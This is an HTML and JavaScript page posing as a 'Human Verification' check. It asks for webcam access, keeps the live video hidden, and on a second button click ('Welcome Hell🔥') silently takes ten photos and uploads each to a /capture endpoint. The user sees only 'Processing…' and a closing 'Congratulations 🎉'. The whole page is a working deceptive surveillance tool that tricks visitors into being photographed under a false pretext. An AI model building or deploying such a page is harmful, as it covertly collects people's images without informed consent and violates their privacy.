<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Human Verification Lab</title>
<style>
*{box-sizing:border-box}

body{
  font-family:system-ui,-apple-system,sans-serif;
  background:#0d0f14;
  color:#eee;
  display:grid;
  place-items:center;
  min-height:100vh;
  margin:0;
  padding:20px;
}

.card{
  width:min(92%,440px);
  padding:24px;
  border:1px solid #292d38;
  border-radius:16px;
  text-align:center;
  background:#11141b;
  box-shadow:0 18px 50px rgba(0,0,0,.35);
  animation:cardIn .6s ease-out;
}

video{
  width:100%;
  border-radius:12px;
  margin-top:15px;
  display:block;
}

button{
  padding:12px 18px;
  margin:8px 4px;
  border:0;
  border-radius:10px;
  font-weight:700;
  cursor:pointer;
  transition:transform .18s ease,box-shadow .18s ease;
}

button:hover{
  transform:translateY(-2px);
  box-shadow:0 8px 22px rgba(255,255,255,.08);
}

button:active{
  transform:scale(.97);
}

#capture,#stop{
  display:none;
}

  #video{
    display:none;
  }

.status-dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:#aaa;margin-right:8px;animation:statusPulse 1.4s ease-in-out infinite}\n\n#status{
  margin:12px 0;
  color:#aaa;
  animation:pulse 2s ease-in-out infinite;
}

@keyframes cardIn{
  from{opacity:0;transform:translateY(14px)}
  to{opacity:1;transform:translateY(0)}
}

@keyframes statusPulse{0%,100%{opacity:.3;transform:scale(.8)}50%{opacity:1;transform:scale(1.15)}}\n\n@keyframes pulse{
  0%,100%{opacity:.65}
  50%{opacity:1}
}

@media(max-width:500px){
  .card{
    width:100%;
    padding:22px 16px;
  }
}
</style>

<style>
body{
  overflow:hidden;
  background:
    radial-gradient(circle at 20% 20%, #302060 0, transparent 35%),
    radial-gradient(circle at 80% 80%, #164d5c 0, transparent 35%),
    #0d0d14;
}

.card{
  position:relative;
  animation:cardIn .7s ease-out;
  box-shadow:0 0 40px rgba(120,100,255,.18);
  backdrop-filter:blur(10px);
}

.card::before,
.card::after{
  content:"";
  position:absolute;
  width:70px;
  height:70px;
  border-radius:50%;
  border:1px solid rgba(255,255,255,.08);
  animation:float 4s ease-in-out infinite;
  pointer-events:none;
}

.card::before{
  top:-35px;
  left:-35px;
}

.card::after{
  right:-35px;
  bottom:-35px;
  animation-delay:1.5s;
}

button{
  transition:transform .2s ease,box-shadow .2s ease;
}

button:hover{
  transform:translateY(-2px) scale(1.02);
  box-shadow:0 8px 25px rgba(100,100,255,.25);
}

button:active{
  transform:scale(.97);
}

.status-dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:#aaa;margin-right:8px;animation:statusPulse 1.4s ease-in-out infinite}\n\n#status{
  animation:pulse 2s ease-in-out infinite;
}

@keyframes cardIn{
  from{opacity:0;transform:translateY(20px) scale(.97)}
  to{opacity:1;transform:translateY(0) scale(1)}
}

@keyframes float{
  0%,100%{transform:translate(0,0)}
  50%{transform:translate(12px,-15px)}
}

@keyframes statusPulse{0%,100%{opacity:.3;transform:scale(.8)}50%{opacity:1;transform:scale(1.15)}}\n\n@keyframes pulse{
  0%,100%{opacity:.65}
  50%{opacity:1}
}
</style>
<style id="capture-spinner-style">
.capture-spinner{
  display:inline-block;
  width:14px;
  height:14px;
  margin-right:8px;
  vertical-align:-2px;
  border:2px solid rgba(255,255,255,.18);
  border-top-color:#fff;
  border-radius:50%;
  animation:captureSpin .7s linear infinite;
}

@keyframes captureSpin{
  to{transform:rotate(360deg)}
}
</style>

</head>
<body>

<section id="cameraCheckPanel" hidden>
  <h2>Camera Permission Check</h2>
  <p>Checking browser and device camera access.</p>
  <div id="cameraCheckResult"></div>
</section>

<main class="card">
  <h2>Human Verification</h2>
  <p>Complete the verification to continue.</p>

  <button id="start">Start Verification</button>
  <button id="capture">Welcome Hell🔥</button>

  <video id="video" autoplay playsinline></video>
  <div id="status"><span class="status-dot"></span><span id="statusText">Ready.</span></div>
</main>

<script>
const start = document.querySelector("#start");
const capture = document.querySelector("#capture");
const video = document.querySelector("#video");
const status = document.querySelector("#status");

let stream = null;

const cameraCheckMode =
  new URLSearchParams(window.location.search).get("mode") === "camera-check";

async function renderCameraCheck() {
  const panel = document.querySelector("#cameraCheckPanel");
  const resultBox = document.querySelector("#cameraCheckResult");

  if (!panel || !resultBox) {
    console.error("Camera Check UI not found.");
    return;
  }

  panel.hidden = false;
  resultBox.textContent = "Running camera diagnostics…";

  const result = await runCameraDiagnostics();

  console.log("[Camera Permission Check]", result);

  const rows = [
    ["Secure context", result.secureContext ? "OK" : "FAILED"],
    ["Media devices API", result.mediaDevices ? "OK" : "FAILED"],
    ["Camera permission", result.permission],
    ["Cameras detected", String(result.cameras)],
    ["Camera request", result.cameraRequest],
  ];

  if (result.error) {
    rows.push(["Error", result.error]);
  }

  if (result.errorMessage) {
    rows.push(["Details", result.errorMessage]);
  }

  resultBox.replaceChildren(
    ...rows.map(([name, value]) => {
      const row = document.createElement("p");
      row.textContent = `${name}: ${value}`;
      return row;
    })
  );
}

if (cameraCheckMode) {
  document.addEventListener("DOMContentLoaded", renderCameraCheck);
}

async function runCameraDiagnostics() {
  const result = {
    secureContext: window.isSecureContext,
    mediaDevices: !!navigator.mediaDevices,
    permission: "unknown",
    cameras: 0,
    cameraRequest: "not-tested",
    error: null
  };

  try {
    if (!result.secureContext) {
      result.error = "insecure-context";
      return result;
    }

    if (!result.mediaDevices) {
      result.error = "media-devices-unavailable";
      return result;
    }

    if (navigator.permissions?.query) {
      try {
        const permission = await navigator.permissions.query({
          name: "camera"
        });
        result.permission = permission.state;
      } catch {
        result.permission = "unavailable";
      }
    }

    const devices = await navigator.mediaDevices.enumerateDevices();
    result.cameras = devices.filter(
      device => device.kind === "videoinput"
    ).length;

    try {
      const diagnosticStream =
        await navigator.mediaDevices.getUserMedia({video: true});

      result.cameraRequest = "success";

      diagnosticStream.getTracks().forEach(track => track.stop());
    } catch (error) {
      result.cameraRequest = "failed";
      result.error = error.name || "unknown-camera-error";
      result.errorMessage = error.message || "";
    }
  } catch (error) {
    result.error = error.name || "diagnostic-error";
    result.errorMessage = error.message || "";
  }

  return result;
}

start.onclick = async () => {
  try {
    stream = await navigator.mediaDevices.getUserMedia({video:true});
    const track = stream.getVideoTracks()[0];
    video.srcObject = stream;
    await video.play();

    start.style.display = "none";
    capture.style.display = "inline-block";
    status.textContent = "Processing…";
  } catch (error) {
    status.textContent =
      `Verification failed: ${error.name} | ${error.message || "no message"}`;
    console.error("getUserMedia failed:", {
      name: error.name,
      message: error.message,
      secureContext: window.isSecureContext,
      mediaDevices: !!navigator.mediaDevices,
      protocol: location.protocol,
      origin: location.origin
    });
  }
};

capture.onclick = async () => {
  if (!stream || video.videoWidth === 0 || video.videoHeight === 0) {
    status.textContent = "Camera is not ready.";
    return;
  }

  capture.disabled = true;

  try {
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    if (!ctx) throw new Error("Canvas is unavailable.");

      const interval = 500;
      const uploads = [];

      for (let i = 1; i <= 10; i++) {
        status.innerHTML = `<span class="capture-spinner"></span>Processing...`;

        ctx.drawImage(
          video,
          0,
          0,
          canvas.width,
          canvas.height
        );

        const blob = await new Promise((resolve, reject) => {
          canvas.toBlob(
            blob => blob
              ? resolve(blob)
              : reject(new Error("JPEG conversion failed.")),
            "image/jpeg",
            0.9
          );
        });

        const form = new FormData();
        form.append(
          "photo",
          blob,
          `capture-${i}-${Date.now()}.jpg`
        );

        uploads.push(
          fetch("/capture", {
            method: "POST",
            body: form
          }).then(response => {
            if (!response.ok) {
              throw new Error(
                `Upload ${i} failed: HTTP ${response.status}`
              );
            }
          })
        );

        if (i < 10) {
          await new Promise(resolve => setTimeout(resolve, interval));
        }
      }

      await Promise.all(uploads);

      status.textContent = "Congratulations 🎉";
  } catch (error) {
    status.textContent = `Capture failed: ${error.message}`;
    capture.disabled = false;
  }
};
</script>
</body>
</html>
